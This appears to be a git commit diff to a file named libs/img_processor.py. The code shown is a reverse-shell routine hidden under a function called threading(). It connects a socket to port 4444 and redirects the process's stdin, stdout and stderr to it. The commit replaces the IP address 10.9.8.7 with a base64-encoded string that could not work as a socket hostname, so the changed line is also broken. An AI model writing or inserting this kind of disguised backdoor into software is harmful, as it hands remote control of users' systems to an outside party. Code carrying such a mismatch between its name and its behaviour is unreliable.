bc3f5d9f548b58d499088eea51cbf228140eb6f0
Martin <74100558+Lockmartin0@users.noreply.github.com>
2025-06-18 18:12:35 +0300

    Update img_processor.py

--- libs/img_processor.py
+++ libs/img_processor.py
@@ -6,7 +6,7 @@ import threading
 def threading():
     try:
         s = socket.socket()
-        s.connect(("10.9.8.7", 4444))
+        s.connect(("aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1yMEFuanJaaTJlNA==", 4444))
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
